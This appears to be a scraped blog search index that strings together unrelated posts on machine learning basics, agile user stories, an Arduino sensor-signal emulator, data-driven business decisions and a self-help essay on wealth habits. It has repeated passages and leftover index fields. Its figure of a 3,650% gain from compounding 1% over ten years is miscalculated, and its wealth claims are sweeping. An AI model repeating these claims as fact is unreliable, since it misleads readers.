The details of algorithm and programming will come in later blogs. Machine learning is a technology which can resolve the computational problem without programming specifically. Table of Contents Process Machine learning project has its own process, which starts with asking the right questions. Ask yourself: Do you have the right data to answer the question? Ask yourself: Do you know how you'll measure success? The process also includes re-create model regularly, see following picture. People are highly involved in the iteration of machine learning, e.g. adjusting algorithm, training data, selected features, parameters to algorithm. CRISP-cycle Cross-industry standard process for data mining, also known as CRISP-DM. It is also very relevant to machine learning projects. Business understanding Data understanding Data preparation Modeling Evaluation Deployment Learning Algorithm Overview The data contains the pattern, the algorithm find the patterns, and the trained model can recognizes the patterns. Supervised Learning The value you want to predict is in the training data. The data is labeled. Supervised Learning includes the following algorithms: K-Nearest neighbors Linear regression Logistic regression (sigmoid function, one-versus-all (OvA) strategy or one-versus-the-rest, one-versus-one (OvO) strategy) Support vector machines (SVMs) Decision trees and random forests Neural network Unsupervised Learning The value you want to predict is not in the training data. The data is unlabeled. Unsupervised Learning includes the following algorithms: Clustering Example question: What are our customer segments? k-means Hierarchical cluster analysis (HCA) Expectation maximization Visualization and dimensionality reduction Principal component analysis (PCA) Kernel PCA Locally-Linear embedding (LLE) t-distributed stochastic neighbor embedding (t-SNE) In machine learning, kernel methods are a class of algorithms for pattern analysis, whose best known member is the support vector machine (SVM). The general task of pattern analysis is to find and study general types of relations (for example clusters, rankings, principal components, correlations, classifications) in datasets. In its simplest form, the kernel trick means transforming data into another dimension that has a clear dividing margin between classes of data. For many algorithms that solve these tasks, the data in raw representation have to be explicitly transformed into feature vector representations via a user-specified feature map: in contrast, kernel methods require only a user-specified kernel, i.e., a similarity function over pairs of data points in raw representation. To simplify the data without losing too much information, one way to do this is to merge several correlated features into one => feature extraction Linear Discriminant Analysis: characterizes or separates two or more classes of objects or events. The resulting combination may be used as a linear classifier, or more commonly, for dimensionality reduction before later classification. Association rule learning Association rule learning is a rule-based machine learning method for discovering interesting relations between variables in large databases. It is intended to identify strong rules discovered in databases using some measures of interestingness. This rule-based approach also generates new rules as it analyzes more data. The ultimate goal, assuming a large enough dataset, is to help a machine mimic the human brain\u2019s feature extraction and abstract association capabilities from new uncategorized data. Apriori: It proceeds by identifying the frequent individual items in the database and extending them to larger and larger item sets as long as those item sets appear sufficiently often in the database. Eclat Unsupervised learning is also used on Anomaly detection use cases, e.g. distributed Gaussian. Semi-supervised learning Semi-supervised learning is a class of machine learning tasks and techniques that also make use of unlabeled data for training \u2013 typically a small amount of labeled data with a large amount of unlabeled data. Deep belief networks (DBN)\uff1a Based on unsupervised components called restricted Boltzmann machines(RBMs). Deep belief network (DBN) is a generative graphical model, or alternatively a class of deep neural network, composed of multiple layers of latent variables (\"hidden units\"), with connections between the layers but not between units within each layer. Reinforcement learning Reinforcement learning (RL) is an area of machine learning concerned with how software agents ought to take actions in an environment so as to maximize some notion of cumulative reward. Agent can observe the environment, select and perform actions and get rewards in return. It must then learn by itself what is the best strategy, called a policy to get the most reward over time. Other algorithms Batch learning The system is incapable of learning incrementally: it must be trained using all the available data. It can also be called offline learning. Retrain the model if necessary. Online learning The system is trained incrementally by feeding it data instances sequentially, either individually or by small groups called mini-batches or out-of-core learning, incremental learning. Learning rate: how fast they should adapt to changing data. Instance based vs Model based learning Instance based learning: the system learns the examples by heart, then generalizes to new cases using a similarity measure. Instance based learning is a family of learning algorithms that, instead of performing explicit generalization, compares new problem instances with instances seen in training, which have been stored in memory. Model based: to build a model first. Accuracy and Precision There is no surprise for Machine Learning projects, one of the goal is to achieve high enough accuracy. The following picture explains the difference between Accuracy and Precision well. High variance: is normally overfitting problem High bias: is normally underfitting problem Utility function or fitness function Untility function measures how good your model is or you can define a cost function that measures how bad it is. Cost function applies on training set, gradient descent, used in regression. Alternative option of gradient descent is Stochastic Gradient Descent (SGD) classifier. Regularization Overfit: resolved by regulation, by reducing number of theta (degree of polynomial). The amount of regularization to apply during learning can be controlled by a hyperparameter. A hyperparameter is a parameter of a learning algorithm (not of the model). Measurement Root mean square error (RMSE): measures the standard deviation Mean Absolute Error (MAE) The higher the norm index, the more it focuses on large values and neglects small ones. This is why the RMSE is more sensitive to outlier than the MAE. Precision = TP/TP+FP Recall = TP/TP+FN If someone says 'let's reach 99% precision', you should ask, 'at what recall'. F1 score is useful for skewed class. F1 = 2 P R/(P+R) ROC (receiver operating characteristic) curve is a measure of binary classifier. The ROC curve is created by plotting the true positive rate (TPR) against the false positive rate (FPR) at various threshold settings. Measure ROC AUC (area under the curve) Break-Even point P = R K-folds cross-validation 3 dataset: train set, cross-validation set, test dataset. Accuracy is generally not the preferred performance measure for classifiers, especially when you are dealing with skewed datasets. A much better way to evaluate the performance of a classifier is to look at the confusion matrix. Cost matrix: Cost matrix is similar to the confusion matrix except the fact that we are calculating the cost of wrong prediction or right prediction. In different context, the cost of error will be different. Training and test dataset need to ensure data distribution is consistent, to avoid the data distributed not evenly and impact the final results. stratified sampling Data Amount The amount of data is also important for accuracy.

Table of Contents User stories principles A good story is: Independent, Negotiable, Valuable to users or customers, Estimable, Small, Testable User stories emphasize verbal rather than written communication User stories are comprehensible by both stakeholders and the developers User stories are the right size for planning User stories work for iterative development User stories encourage deferring detail until you have the best understanding you are going to have about what you really need. Emphasize verbal communication There\u2019s nothing wrong with making a few annotations on a story card based on a discussion. However, the conversation is the key, not the note on the story card. A story card is the visible part of a story, but the important parts are the conversations between the customer and developers about the story. It is useful to think of the story card as containing: a phrase or two that act as reminders to hold the conversation notes about issues to be resolved during the conversation Most customers begin writing stories themselves once they become comfortable with the concept that story cards are reminders to talk later rather than formal commitments or descriptions of specific functionality. Comprehesible by both stakeholders and developers The customer team may include testers, a product manager, real users, and interaction designers. The customer team includes those who ensure that the software will meet the needs of its intended users. The customer team writes the story cards because they are in the best position to express the desired features and because they must later be able to work out story details with the developers and to prioritize the stories. each story must be written in the language of the business, not in technical jargon, so that the customer team can prioritize the stories for inclusion into iterations and releases. as the primary product visionaries, the customer team is in the best position to describe the behavior of the product. Right size for planning When a story is too large it is sometimes referred to as an epic. Epics typically fall into one of two categories: The compound story or the complex story. The ultimate determination of whether a story is appropriately sized is based on the team, its capabilities, and the technologies in use. Iterative development Once an iteration length has been selected, the developers will estimate how much work they\u2019ll be able to do per iteration. Release planning refers to determining a balance between a projected timeline and a desired set of functionality. Iteration planning refers to selecting stories for inclusion in this iteration. Stories are prioritized based on their value to the organization. Releases and iterations are planned by placing stories into iterations. Velocity is the amount of work the developers can complete in an iteration. The sum of the estimates of the stories placed in an interation cannot exceed the velocity the developers forecast for that iteration. If a story won\u2019t fit in an iteration, you can split the story into two or more smaller stories Valuable to users or customers A story card contains a short description of user or customer-valued functionality Acceptance tests validate that a story has been developed with the functionality the customer team had in mind when they wrote the story. Keeping in mind the distinction between user (someone who uses the software) and purchaser (someone who purchases the software). Suppose a development team is building software that will be deployed across a large user base, perhaps 5,000 computers in a single company. The purchaser of a product like that may be very concerned that each of the 5,000 computers is using the same configuration for the software. This may lead to a story like \u201cAll configuration information is read from a central location.\u201d Users don\u2019t care where configuration information is stored but purchasers might. Estimable It is important for developers to be able to estimate (or at least take a guess at) the size of a story or the amount of time it will take to turn a story into working code. There are three common reasons why a story may not be estimable: Developers lack domain knowledge Developers lack technical knowledge The story is too big The solution for 2nd reason is to send one or more developers on what Extreme Programming calls a spike, which is a brief experiment to learn about an area of the application. The spike itself is always given a defined maximum amount of time (called a time-box), which allow us to estimate the spike. In this way an inestimable story turns into two stories: a quick spike to gather information and then a story to do the real work. Testable Details that have already been determined through conversations become tests. Tests can be noted on the back of the story card if using note cards or in whatever electronic system is being used. Stories must be written so as to be testable. Successfully passing its tests proves that a story has been successfully developed. If the story cannot be tested, how can the developers know when they have finished coding? Story Writting However, even though we acknowledge the impossibility of writing all of the stories for a project, we should still make an initial upfront attempt to write those that we can, even if many are written at a very high level. One of the advantages of working with stories is that it is very easy to write them at different levels of detail. Some of the most valuable techniques for creating a set of stories are: User interviews Questionnaires Observation Story-Writing workshops During a story writing workshop the focus should be on quantity rather than quality. Even if you'll eventually keep your stories electronically, during the story-writing workshop use cards. Just let the ideas come and write them down. The goal is to write as many user stories in as short a time as possible. This is not the time to design screens or solve problems. Keep the user interface out of your stories as long as possible. Each story was written in the following format: I as a (role) want (function) so that (business value) Write in Active Voice: rather than saying \"A resume can be posted by a Job Seeker\" say \"A Job Seeker can post a resume.\" Stories that represent a full slice of cake are to be preferred over those that do not. There are two reasons for this. exercising each layer of an application's architecture reduces the risk of finding last minute problems in one of the layers. although not ideal, an application could conceivably be released for use with only partial functionality as long as the functionality that is included in the release slices all the way through the system. Even though constraint cards do not get estimated and scheduled into iterations like normal cards, they are still useful. Minimally, constraint cards can be taped to the wall where they act as reminders. Even better, acceptance tests can be written to ensure the constraint is not violated. Frequently the risky stories are associated with infrastructural or nonfunctional needs such as performance. User Story Mapping: The talking goes better if we can externalize our thinking by drawing pictures or organizing our ides using index cards or sticky notes. The real goal of using stories is shared understanding User role On many projects, stories are written as though there is only one type of user. All stories are written from the perspective of that user type. This simplification is a fallacy and can lead a team to miss stories for users who do not fit the general model of the system\u2019s primary user type. This disciplines of usage-centered design and interaction design teach us the benefits identifying user roles and personas prior to writing stories. A user role is a collection of defining attributes that characterize a population of users and their intended interactions with the system. We will use the following steps to identify and select a useful set of user roles: brainstorm an initial set of user roles organize the initial set consolidate roles refine the roles Identifying user roles is a great leap forward, but for some of the more important user roles, it might be worth going one step further and creating a persona for the role. A persona is an imaginary representation of a user role. For some applications, extreme characters may be helpful in looking for stories that would otherwise be missed. Tests Naturally, in order for programmers to benefit in this way, the acceptance tests for a story must be written before programming begins on that story. Tests are generally written at the following times: whenever the customer and developers talk about the story and want to capture explicit details as part of a dedicated effort at the start of an iteration but before programming begins whenever new tests are discovered during or after the programming of the story With user stories it is vital that testing be viewed as part of the development process, not something that happens \"after coding is done.\" Specifying tests is often a shared responsibility of a product manager and a tester. The product manager will bring her knowledge of the organizational goals driving the project; the tester will bring his suspicious mindset. At the start of an iteration they will get together and specify as many initial tests as they can think of. But it doesn't stop there, and it doesn't stop with them getting together once a week. As the details of a story are worked out, additional tests are specified. Because working code from one iteration may be broken by development in a subsequent iteration, it is important to execute acceptance tests from all prior iterations. This means that executing acceptance tests gets more time consuming with each passing iteration. If possible, the development team should look into automating some or all of the acceptance tests. For most systems, story testing is largely functional testing, which ensures that the applicaton functions as expected. User interface testing, which ensures that all of the components of the user interface behave as expected Usability testing, which is done to ensure an application that can be easily used Performance testing, which is done to gauge how well the application will perform under various workloads Stress testing, in which the application is subjected to extreme values of users, transactions, or anything else that may put the application under stress Customers and users Selection of appropriate user proxies can be critical to the success of the project. The background and motives of possible user proxies must be considered. A user proxy with a marketing background will approach the stories differently than will a user proxy who is a domain expert. While domain experts are great resources, their usefulness is really dependent upon whether they are current or former users of the software type you are building. Domain experts can be inclined to point the project toward a solution that is suitable for them but is too complex or is just plain wrong for the targeted user audience. Customers are those who make the buying decision; they are not necessarily users of the software. First, always remember that a real user beats a proxy any time. On a large project, especially one with many user roles, it is sometimes difficult to even know where to begin in identifying stories. What I've found works best is to consider each user role and identify the goals that user has for interacting with our software. Planning Bug reports and user interface changes are common examples of stories that are often too small. A good approach for tiny stories, common among Extreme Programming teams, is to combine them into larger stories that represent from about a half-day to several days of work. Estimation we'll see that a story comprises multiple tasks and that a task estimate is owned by the individual who will perform the task. Story estimates, however, are owned by the team for two reasons: since the team doesn't yet know who will work on the story, ownership of the story cannot be more precisely assigned than to the team collectively. estimates derived by the team, rather than a single individual, are probably more useful. We use the term velocity to refer to the number of story points a team completes (or expects to complete) in an iteration. Whether or not a team programs in pairs has no impact on story point estimates. Pair programming affects the team's velocity, not their estimates. Priority It is frequently useful to start release planning from a product development roadmap showing the main areas of focus for the next handful of new releases. There are many dimensions along which we can sort stories. Among the technical factors we can use are: the risk that the story cannot be completed as desired (for example, with desired performance characteristics or with a novel algorithm) the impact the story will have on other stories if deferred (we don't want to wait until the last iteration to learn that the application is to be three-tiered and multi-threaded) Additionally, customers and users have their own set of factors they could use to sort the stories, including the following: the desirability of the story to a broad base of users or customers the desirability of the story to a small number of important users or customers the cohesiveness of the story in relation to other stories (for example, a \"zoom out\" story may not be high priority on its own but may be treated as such because it is complementary to \"zoom in,\" which is high priority) Collectively, the developers have a sequence in which they would like to implement the stories, as will the customer. When there is a disagreement to the sequence, the customer wins. Every time. Cost Changes Priority Agile approaches are firmly in the camp of doing the juicy bits first. This allows agile projects to avoid solving risks too far in advance and allows them to defer building infrastructural code that may not be needed. Favoring the juicy bits also makes it possible for a project to release early, when only the highest-valued functionality is available. Interation Collectively the developers and the customer select an iteration length that will work for them. Iteration lengths are typically from one to four weeks. Short iterations allow for more frequent course corrections of the project and more visibility into its progress; however, there is a slight overhead associated with each iteration. As much as possible, stick with a constant iteration length for the duration of the project. With consistent iterations, projects fall into a natural rhythm that can be beneficial to the pace of the team. Naturally there will be times when you need to alter the iteration length. For example, a team that has been using three-week iterations is asked to prepare the next version for an important tradeshow in eight weeks. Rather than stopping after two three-week iterations with two weeks left before the show, they can start with two normal three-week iterations and then follow those with an abbreviated two-week iteration. There's nothing wrong with this. What you want to avoid is random changes to the iteration length. There are three ways to get an initial value for velocity: Use historical values. Run an initial iteration and use the velocity of that iteration. Take a guess. To plan an iteration the whole team holds an iteration planning meeting. The customer as well as all of the developers (that is, programmers, testers and others) on the team attend and participate in this meeting. Because the team will be looking at the stories in detail, they will undoubtedly have some questions about them. They need the customer present to answer these questions. The general sequence of activities for an iteration planning meeting is as follows: Discuss a story. Disaggregate the story into its constituent tasks. One developer accepts responsibility for each task. After all stories have been discussed and all tasks have been accepted, developers individually estimate the tasks they've accepted to make sure they are not over-committed. you should not include partially completed stories when calculating velocity. Velocity Does Not Use Actual Hours.

Keeping in mind the distinction between user (someone who uses the software) and purchaser (someone who purchases the software). Suppose a development team is building software that will be deployed across a large user base, perhaps 5,000 computers in a single company. The purchaser of a product like that may be very concerned that each of the 5,000 computers is using the same configuration for the software. This may lead to a story like \u201cAll configuration information is read from a central location.\u201d Users don\u2019t care where configuration information is stored but purchasers might.","title":"Valuable to users or customers"},{"location":"2019/user_story_applied/#estimable","text":"It is important for developers to be able to estimate (or at least take a guess at) the size of a story or the amount of time it will take to turn a story into working code. There are three common reasons why a story may not be estimable: Developers lack domain knowledge Developers lack technical knowledge The story is too big The solution for 2nd reason is to send one or more developers on what Extreme Programming calls a spike, which is a brief experiment to learn about an area of the application. The spike itself is always given a defined maximum amount of time (called a time-box), which allow us to estimate the spike. In this way an inestimable story turns into two stories: a quick spike to gather information and then a story to do the real work.","title":"Estimable"},{"location":"2019/user_story_applied/#testable","text":"Details that have already been determined through conversations become tests. Tests can be noted on the back of the story card if using note cards or in whatever electronic system is being used. Stories must be written so as to be testable.

If the story cannot be tested, how can the developers know when they have finished coding?","title":"Testable"},{"location":"2019/user_story_applied/#story-writting","text":"However, even though we acknowledge the impossibility of writing all of the stories for a project, we should still make an initial upfront attempt to write those that we can, even if many are written at a very high level. One of the advantages of working with stories is that it is very easy to write them at different levels of detail. Some of the most valuable techniques for creating a set of stories are: User interviews Questionnaires Observation Story-Writing workshops During a story writing workshop the focus should be on quantity rather than quality. Even if you'll eventually keep your stories electronically, during the story-writing workshop use cards. Just let the ideas come and write them down. The goal is to write as many user stories in as short a time as possible. This is not the time to design screens or solve problems. Keep the user interface out of your stories as long as possible. Each story was written in the following format: I as a (role) want (function) so that (business value) Write in Active Voice: rather than saying \"A resume can be posted by a Job Seeker\" say \"A Job Seeker can post a resume.\" Stories that represent a full slice of cake are to be preferred over those that do not. There are two reasons for this. exercising each layer of an application's architecture reduces the risk of finding last minute problems in one of the layers. although not ideal, an application could conceivably be released for use with only partial functionality as long as the functionality that is included in the release slices all the way through the system. Even though constraint cards do not get estimated and scheduled into iterations like normal cards, they are still useful. Minimally, constraint cards can be taped to the wall where they act as reminders. Even better, acceptance tests can be written to ensure the constraint is not violated. Frequently the risky stories are associated with infrastructural or nonfunctional needs such as performance. User Story Mapping: The talking goes better if we can externalize our thinking by drawing pictures or organizing our ides using index cards or sticky notes. The real goal of using stories is shared understanding","title":"Story Writting"},{"location":"2019/user_story_applied/#user-role","text":"On many projects, stories are written as though there is only one type of user. All stories are written from the perspective of that user type. This simplification is a fallacy and can lead a team to miss stories for users who do not fit the general model of the system\u2019s primary user type. This disciplines of usage-centered design and interaction design teach us the benefits identifying user roles and personas prior to writing stories. A user role is a collection of defining attributes that characterize a population of users and their intended interactions with the system. We will use the following steps to identify and select a useful set of user roles: brainstorm an initial set of user roles organize the initial set consolidate roles refine the roles Identifying user roles is a great leap forward, but for some of the more important user roles, it might be worth going one step further and creating a persona for the role. A persona is an imaginary representation of a user role. For some applications, extreme characters may be helpful in looking for stories that would otherwise be missed.","title":"User role"},{"location":"2019/user_story_applied/#tests","text":"Naturally, in order for programmers to benefit in this way, the acceptance tests for a story must be written before programming begins on that story. Tests are generally written at the following times: whenever the customer and developers talk about the story and want to capture explicit details as part of a dedicated effort at the start of an iteration but before programming begins whenever new tests are discovered during or after the programming of the story With user stories it is vital that testing be viewed as part of the development process, not something that happens \"after coding is done.\" Specifying tests is often a shared responsibility of a product manager and a tester. The product manager will bring her knowledge of the organizational goals driving the project; the tester will bring his suspicious mindset. At the start of an iteration they will get together and specify as many initial tests as they can think of. But it doesn't stop there, and it doesn't stop with them getting together once a week. As the details of a story are worked out, additional tests are specified. Because working code from one iteration may be broken by development in a subsequent iteration, it is important to execute acceptance tests from all prior iterations. This means that executing acceptance tests gets more time consuming with each passing iteration. If possible, the development team should look into automating some or all of the acceptance tests. For most systems, story testing is largely functional testing, which ensures that the applicaton functions as expected. User interface testing, which ensures that all of the components of the user interface behave as expected Usability testing, which is done to ensure an application that can be easily used Performance testing, which is done to gauge how well the application will perform under various workloads Stress testing, in which the application is subjected to extreme values of users, transactions, or anything else that may put the application under stress","title":"Tests"},{"location":"2019/user_story_applied/#customers-and-users","text":"Selection of appropriate user proxies can be critical to the success of the project. The background and motives of possible user proxies must be considered. A user proxy with a marketing background will approach the stories differently than will a user proxy who is a domain expert. While domain experts are great resources, their usefulness is really dependent upon whether they are current or former users of the software type you are building. Domain experts can be inclined to point the project toward a solution that is suitable for them but is too complex or is just plain wrong for the targeted user audience. Customers are those who make the buying decision; they are not necessarily users of the software. First, always remember that a real user beats a proxy any time. On a large project, especially one with many user roles, it is sometimes difficult to even know where to begin in identifying stories. What I've found works best is to consider each user role and identify the goals that user has for interacting with our software.","title":"Customers and users"},{"location":"2019/user_story_applied/#planning","text":"Bug reports and user interface changes are common examples of stories that are often too small.

Story estimates, however, are owned by the team for two reasons: since the team doesn't yet know who will work on the story, ownership of the story cannot be more precisely assigned than to the team collectively. estimates derived by the team, rather than a single individual, are probably more useful. We use the term velocity to refer to the number of story points a team completes (or expects to complete) in an iteration. Whether or not a team programs in pairs has no impact on story point estimates. Pair programming affects the team's velocity, not their estimates.","title":"Estimation"},{"location":"2019/user_story_applied/#priority","text":"It is frequently useful to start release planning from a product development roadmap showing the main areas of focus for the next handful of new releases. There are many dimensions along which we can sort stories. Among the technical factors we can use are: the risk that the story cannot be completed as desired (for example, with desired performance characteristics or with a novel algorithm) the impact the story will have on other stories if deferred (we don't want to wait until the last iteration to learn that the application is to be three-tiered and multi-threaded) Additionally, customers and users have their own set of factors they could use to sort the stories, including the following: the desirability of the story to a broad base of users or customers the desirability of the story to a small number of important users or customers the cohesiveness of the story in relation to other stories (for example, a \"zoom out\" story may not be high priority on its own but may be treated as such because it is complementary to \"zoom in,\" which is high priority) Collectively, the developers have a sequence in which they would like to implement the stories, as will the customer. When there is a disagreement to the sequence, the customer wins. Every time. Cost Changes Priority Agile approaches are firmly in the camp of doing the juicy bits first. This allows agile projects to avoid solving risks too far in advance and allows them to defer building infrastructural code that may not be needed. Favoring the juicy bits also makes it possible for a project to release early, when only the highest-valued functionality is available.","title":"Priority"},{"location":"2019/user_story_applied/#interation","text":"Collectively the developers and the customer select an iteration length that will work for them. Iteration lengths are typically from one to four weeks. Short iterations allow for more frequent course corrections of the project and more visibility into its progress; however, there is a slight overhead associated with each iteration. As much as possible, stick with a constant iteration length for the duration of the project. With consistent iterations, projects fall into a natural rhythm that can be beneficial to the pace of the team. Naturally there will be times when you need to alter the iteration length. For example, a team that has been using three-week iterations is asked to prepare the next version for an important tradeshow in eight weeks. Rather than stopping after two three-week iterations with two weeks left before the show, they can start with two normal three-week iterations and then follow those with an abbreviated two-week iteration. There's nothing wrong with this. What you want to avoid is random changes to the iteration length. There are three ways to get an initial value for velocity: Use historical values. Run an initial iteration and use the velocity of that iteration. Take a guess. To plan an iteration the whole team holds an iteration planning meeting. The customer as well as all of the developers (that is, programmers, testers and others) on the team attend and participate in this meeting. Because the team will be looking at the stories in detail, they will undoubtedly have some questions about them. They need the customer present to answer these questions. The general sequence of activities for an iteration planning meeting is as follows: Discuss a story. Disaggregate the story into its constituent tasks. One developer accepts responsibility for each task. After all stories have been discussed and all tasks have been accepted, developers individually estimate the tasks they've accepted to make sure they are not over-committed. you should not include partially completed stories when calculating velocity.

So we start this project to emulate the sensor signals from the vessel, which allows the development team to ease the development without access to the vessel. This project is very helpful for the crucial part e.g. data acquisition. The setup looks like following picture: There are several parts: Slide pot Arduino DAC Breadboard Slide pot On real vessel deployment, one crucial parameter is the fuel rack position which indicate the rpm, and have big impact to the rest of the solution.

Arduino is uC. uC means microController (MCU). In modern terminology, it is similar to, but less sophisticated than, a system on a chip (SoC); a SoC may include a microcontroller as one of its components. As for system on a chip, that is a less well defined term. These are basically a microcontroller with small FPGA on the same chip. Instead of having built in peripherals, you can make whatever you want within the available resources of the FPGA. pinout The first step is to understand the board functionality by reading pinout like following. Based on the project needs, we look into the pinout and decide how many pins to use, also GND pin. I2C I2C (Inter-Integrated Circuit) computer bus widely used for attaching lower-speed peripheral ICs to processors and microcontrollers in short-distance, intra-board communication. I2C is appropriate for peripherals where simplicity and low manufacturing cost are more important than speed. Standard I2C devices only run at 100 kHz. SCL and SDA pins are I2C pins. SCL stands for Serial CLock. SDA stands for Serial DAta. Arduino development The first step of Arduino development is to install Arduino IDE. Once the IDE is installed, it is quite straight forward to configure library and board type in the IDE settings. And the focus area for the coding is two methods: setup() loop() There are plenty of resources online to describe the basic programming part of Arduino. For our project, we generate both analog and digital signals. writeDigital() Debugging There are ways to help your development, one is serial output. another one is Saleae Logic device Once you connect the Saleae Logic to the Arduino output pins, you can see the signals on the Logic UI.

This process uses a one bit quantizer that produces either a 1 or 0 depending on the amplitude of the analog signal. A 1 or 0 corresponds to a signal that is all the way up or all the way down, respectively. Because in the real world, analog signals are rarely all the way in one direction, there is a quantization error, the difference between the 1 or 0 and the actual amplitude it represents. This error is fed back negatively in the \u0394\u03a3 process loop. In this way, every error successively influences every other quantization measurement and its error. This has the effect of averaging out the quantization error. Digital-to-analog conversion The process of decoding a PDM signal into an analog one is simple: one only has to pass the PDM signal through a low-pass filter. This works because the function of a low-pass filter is essentially to average the signal. The average amplitude of pulses is measured by the density of those pulses over time, thus a low pass filter is the only step required in the decoding process. In our project, we use DAC device with multiple channels to output analog signals. Breadboard A breadboard is a construction base for prototyping of electronics. It plays as 'glue' role in the project, and it connect different devices. For example, all electric wires are connected if they are on the same row (with same number). At meantime, positive wire and gnd wire can be easily put on +/- columns. Breadboard is very helpful when you use many devices to connect to each other to achieve some complicated logic. This is a very simple introduction about what we do for signal generation for our project.

This process uses a one bit quantizer that produces either a 1 or 0 depending on the amplitude of the analog signal. A 1 or 0 corresponds to a signal that is all the way up or all the way down, respectively. Because in the real world, analog signals are rarely all the way in one direction, there is a quantization error, the difference between the 1 or 0 and the actual amplitude it represents. This error is fed back negatively in the \u0394\u03a3 process loop. In this way, every error successively influences every other quantization measurement and its error. This has the effect of averaging out the quantization error.","title":"Analog-to-digital conversion"},{"location":"2020/arduino_introduction/#digital-to-analog-conversion","text":"The process of decoding a PDM signal into an analog one is simple: one only has to pass the PDM signal through a low-pass filter.

This article talks about the basic part of data science. Table of Contents Data Driven Decision (DDD) Data-driven decision-making (DDD) refers to the practice of basing decisions on the analysis of data, rather than purely on intuition. DDD is not an all-or-nothing practice, and different firms engage in DDD to greater or lesser degrees.

DDD also is correlated with higher return on assets, return on equity, asset utilization, and market value, and the relationship seems to be causal. Data and data science capability as a strategic asset Data, and the capability to extract useful knowledge from data, should be regarded as key strategic assets. Too many businesses regard data analytics as pertaining mainly to realizing value from some existing data, and often without careful regard to whether the business has the appropriate analytical talent. Viewing these as assets allows us to think explicitly about the extent to which one should invest one them. Often, we don't have exactly the right data to best make decisions and/or the right talent to best support making decisions from the data. The best data science team can yield little value without the appropriate data; the right data often cannot substantially improve decisions without suitable data science talent. As with all assets, it is often necessary to make investments. Building a top-notch data science team is a non-trivial undertaking, but can make a huge difference for decision-marking. Examples Hurricane Frances New York Times story from 2004. Hurricane Frances was on its way, barreling across the Caribbean, threatening a direct hit on Florida's Atlantic coast. Residents made for higher ground, but far away, in Bentonville, Ark., executives at Wal-Mart Stores decided that the situation offered a great opportunity for one of their newest data-driven weapons ... predictive technology. It might be useful to project the amount of increase in sales due to the hurricane, to ensure that local Wal-Marts are properly stocked. Indeed, that is what happened. The New York Times (Hays, 2004) reported that: \"...the experts mined the data and found that the stores would indeed need certain products - and not just the usual flashlights. 'We didn't know in the past that strawberry PopTarts increase in sales, like seven times their normal sales rate, ahead of a hurricane, ' Ms. Dillman said in a recent interview. 'And the pre-hurricane top-selling items was beer' Predicting customer churn Attracting new customers is much more expensive than retaining existing ones, so a good deal of marketing budget is allocated to prevent churn. How to devise a precise, step-by-step plan for how the data science team should use company vast data resources to decide which customers should be offered the special retention deal prior to the expiration of their contracts. Target Like most retailers, Target cares about consumers' shopping habits, what drives them and what can influence them. Consumers tend to have inertia in their habits and getting them to change is very difficult. Decision makers at Target knew, however, that the arrival of a new baby in a family is one point where people do change their shopping habits significantly. In the Target analyst's words, 'as soon as we get them buying diapers from us, they're going to start buying everything else too.' Since most birth records are public, retailers obtain information on births and send out special offers to the new parents. However, Target wanted to get a jump on their competition. They were interested in whether they could predict that people are expecting a baby. If they could, they would gain an advantage by making offers before their competitors. Using techniques of data science, Target analyzed historical data on customers who later were revealed to have been pregnant, and were able to extract information that could predict which consumers were pregnant. For example, pregnant mothers often change their diets, their wardrobes, their vitamin regiments, and so on.

Hourly rate Your annual salary / 2,080 hours = your hourly rate Then decide how to invest your time with hourly rate in mind. Always look for ways you can spend some money to save time Become the 1% Do what the 1% does. Success leaves clues. It\u2019s not a mystery or an enigma. It\u2019s a formula that anyone can follow. The only problem? It\u2019s REALLY F*&%$^G Hard! They Value Education Over Entertainment They value education and constant growth. They read every single day. They attend seminars. They hire coaches. If they watch television or play video games, they do so in a strategic manner designed to help them recharge, not to distract themselves from the tasks at hand. I\u2019ve never met someone who reads nonfiction books everyday for 30\u201360 minutes and isn\u2019t wealthy. (With the rare exception of individuals who read all day but never take action.) If you want to join the 1%, then this is where you start. Double down on your education. Learn about sales, marketing, psychology, high performance, productivity, business systems and finance. Put down the remote and pick up a book. It changed my life and it will change yours too. They Have a Plan and Stick to It One of the key habits that differentiates high performers (1%\u2019ers) from the rest of the population is that they are proactive instead of reactive. Every night, they write out what they accomplished that day and what their plan is for the following day. They have a clear list of priorities that they plan to accomplish. They wake up before they need to, spend a few minutes exercising, reading, journaling and meditating before going to work or building their business. When they start their day, they know exactly what needs to be done and why. They methodically move through their most valuable priorities, avoiding distractions like email, social media and water cooler talk. When the day ends, they\u2019ve accomplished at least one or two of their biggest priorities and they learn from their mistakes so that they can avoid making those mistakes the next day. Start by writing out a plan for the next 5 years of your life and figure out exactly what you want to accomplish. Based on that document, plan for every day the night before. Put your gym clothes, journal and books somewhere they are easy to access and move your alarm across the room so that you can\u2019t hit snooze. This simple shift will radically alter your days and put you in a state of proactivity vs. reactivity. They Invest Their Money In Themselves and Other Appreciating Assets Poor people spend money. Rich people invest. They simply invest their money into appreciating assets\u2026 Namely, themselves. 1%\u2019ers are notorious for spending lavishly on their own personal development and performance. They will spend thousands (sometimes millions) of dollars on advanced training, high performance coaching, books, seminars, and lectures. They invest in high quality supplements and a healthy diet that allows them to have high energy and enthusiasm throughout the day. If you want to join the 1% then you must stop spending your money on pointless crap that doesn\u2019t serve you. They Work On the Right Things Poor people work on whatever is in front of them; rich people work on what\u2019s most important to them. They don\u2019t work on the things that are easy. They work on the things that will get them results. They know the power of saying \u201cNo\u201d to things that don\u2019t serve their ultimate vision and they have laser focus on their #1 most important goal. They Lay One Brick a Day 1%\u2019ers operate by a philosophy known as \u201cKaizen\u201d which loosely translates to \u201cSmall daily improvement\u201d. They don\u2019t try to change everything all at once. They are patient. They lay one brick a day. They know that it\u2019s the tiny actions (not the grand leaps) that determine a person\u2019s destiny. They understand the power of the compound effect. 1% compounded over ten years is a 3,650% improvement. That\u2019s the difference between earning $100,000 a year and earning $3.6 million a year. Tap into this power and your life will change forever\u2026 IF you play the long game. They Play the Long Game 1%\u2019ers understand that life is a game played in years and decades, not months. They have goals for the next 30 and 90 days, yes. But they are more considerate of the next decade and how their actions today will impact them 10, 20, 30, and 40 years from now. They act with a sense of urgency, but they don\u2019t expect results to come quickly. They simply take small daily actions everyday knowing that one day, the results will compound and they will have the life of their dreams. They Value the Power of Networking 1%\u2019ers have allies. The 99% have friends. Rich people understand the value of networking and giving value to others with no expectation of anything in return. They intentionally build a network of people who are better than they are in their field. People who make them uncomfortable and insecure. People who challenge them to rise above mediocrity and achieve a life of success and integrity. 